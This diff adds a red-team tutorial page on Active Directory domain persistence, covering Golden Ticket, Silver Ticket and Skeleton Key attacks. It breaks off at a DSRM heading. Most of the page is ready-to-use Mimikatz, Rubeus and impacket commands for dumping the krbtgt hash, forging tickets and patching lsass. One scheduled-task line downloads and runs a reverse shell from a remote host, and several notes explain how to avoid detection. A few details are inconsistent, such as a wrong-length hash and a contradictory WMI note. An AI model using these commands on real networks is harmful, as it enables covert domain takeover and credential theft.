@@ -3,3 +3,199 @@ title: Domain Persistence
 category: Active Directory
 order: 3
 ---
+
+There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears.
+
+These are some techniques to make a persistence on a domain.
+
+# Golden Ticket
+
+A golden ticket is signed and encrypted by the hash of `krbtgt` account which makes it a valid TGT ticket. Since user account **validation is not done** by the KDC until **TGT** is **older than 20 minutes**. So we can use even deleted/revoked accounts.
+
+To conclude, the `krbtgt` user hash could be used to impersonate any user with any privileges from even a non-domain machine.
+
+First we need to obtain the `krbtgt` hash:
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc.corp.local
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
+```
+> **RedTeam Note**: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA.
+
+After that we need to create the ticket.
+
+* **Invoke-Mimikatz**
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'
+```
+> **Note**: `/ptt` injects the ticket in current PowerShell process.
+>
+> `/ticket` saves the ticket to a file for later use.
+
+> **RedTeam Note**: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it.
+>
+> `/endin:600` Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600).
+>
+> `/renewmax:10080` Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)
+
+* **Rubeus.exe**
+
+```
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+```
+
+* **Ticketer.py (impacket)**
+
+```
+python ticketer.py -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-268341927-4156873456-1784235843 -domain corp.local Administrator
+export KRB5CCNAME=./administrator.ccache
+python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
+```
+
+Use `klist` to list all kerberos tickets:
+
+```
+klist
+```
+
+With a Golden Ticket we can access to any resource of the domain such as shared files (**C$**), and execute services and WMI, so we can user **psexec** or **wmiexec** to obtain a shell.
+
+```
+ls \\dc01.corp.local\c$
+```
+> **Note**: A shell via WMI can not be obtained, so do not use PowerShell Remote.
+
+[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
+
+[https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket](https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket)
+
+# Silver Ticket
+
+A Silver Ticket is a valid **TGS** which is encrypted and signed by the NTLM hash of the service account of the service running with that account. Services will allow access only to the services themselves.
+
+This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash.
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc01
+```
+After that we need to create the ticket.
+
+* **Invoke-Mimikatz**
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc01.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'
+```
+
+> **Note**: Similar command can be used for any other service on a machine: `CIFS`, `HOST`, `RPCSS`, `WSMAN`...
+
+Use `klist` to list all kerberos tickets:
+
+```
+klist
+```
+And finally we can list the content of File System.
+
+```
+ls \\dc01.corp.local\c$
+```
+
+This table shows the available services:
+
+|                Service Type                |       Service Silver Ticket       |
+|:------------------------------------------:|:---------------------------------:|
+|                     WMI                    |             HOST RPCSS            |
+|             PowerShell Remoting            | HOST HTTP  And Maybe: WSMAN RPCSS |
+|                    WinRM                   |    HOST HTTP  And Maybe: WINRM    |
+|               Scheduled Tasks              |                HOST               |
+|        Windows File Sharing, PsExec        |                CIFS               |
+| LDAP operations, DCSync                    | LDAP                              |
+| Windows Remote Server Administration Tools | RPCSS LDAP CIFS                   |
+| Golden Tickets                             | krbtgt                            |
+
+
+There are many ways of achieve command executing using Silver Ticket.
+
+## Schedule and Execute a task
+
+We just need to create a ticket for the `HOST` SPN which will allow us to schedule a task on the target. And then schedule and execute a task.
+
+```powershell
+schtasks /create /S dc01.corp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"
+
+schtasks /Run /S dc01.corp.local /TN "STCheck"
+```
+> **Note**: In that case a Nishang Reverve TCP shell was spawned.
+
+## Execute WMI queries
+
+To execute WMI queries we just need to create a ticket for the `HOST` and `RPCSS`.
+
+```powershell
+Get-WmiObject -Class win32_operatingsystem -ComputerName $Computer
+
+Invoke-WmiMethod win32_process -ComputerName $Computer -Name create -ArgumentList "$RunCommand"
+
+wmic dc01.corp.local list full /format:list
+```
+
+## PsExec
+
+To run commands on other machine with `PsExec` we just need to create a ticket for `CIFS` service.
+
+```powershell
+.\PsExec.exe -accepteula \\dc01.corp.local cmd
+```
+
+## PowerShell Remote
+
+With winrm access over a computer you can access it with PowerShell Remote. A ticket with `HOST` and `WSMAN` is needed.
+
+```powershell
+$sess = New-PSSession -ComputerName dc01.corp.local
+Enter-PSSession -Session $sess
+```
+
+## Dump DC database with DCSync
+
+We can dump DC database using DCSync by crafting a silver ticket with the `LDAP` SPN.
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /dc:dc01.corp.local /domain:corp.local /user:krbtgt"'
+```
+
+# Skeleton Key
+
+Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware.
+
+All the publicly known methods are NOT persistent across reboots.
+
+> **RedTeam Notes**: Its not probably that a enterprise reboot the DC or kill `lsass` process.
+
+To execute this technique domain admin privilegs are required.
+
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.corp.local
+```
+
+So it is possible to access any machine with a valid username and `mimikatz` as password.
+
+```powershell
+Enter-PSSession -ComputerName dc01.corp.local -Credential corp\Administrator
+```
+> **Note**: In the skeleton key attack both passwords work at the same time, the actual password and `mimikatz` as password.
+
+In case `lsass` is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver `mimidriv.sys` on disk of the target dc. Be careful this would be very noisy in logs.
+
+```
+mimikatz# privilege::debug
+mimikatz# !+
+mimikatz# !processprotect /process:lsass.exe /remove
+mimikatz# misc::skeleton
+mimikatz# !-
+```
+
+The DC can not be patched twice.
+
+# DSRM
